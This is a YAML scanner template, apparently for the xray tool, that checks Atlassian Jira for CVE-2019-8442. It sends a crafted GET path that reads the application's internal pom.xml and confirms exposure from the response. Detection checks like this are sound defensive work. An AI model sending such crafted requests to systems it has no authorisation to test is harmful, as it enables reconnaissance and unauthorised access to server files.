detail:
  Affected Version: <7.13.4, 8.00-8.0.4, 8.1.0-8.1.1
  author: pa55w0rd(www.pa55w0rd.online/)
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2019-8442
expression: r0()
manual: true
name: poc-yaml-jira-cve-2019-8442
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(b"<groupId>com.atlassian.jira</groupId>")))
      && response.content_type.contains("application/xml")
    request:
      cache: true
      method: GET
      path: /s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
transport: http
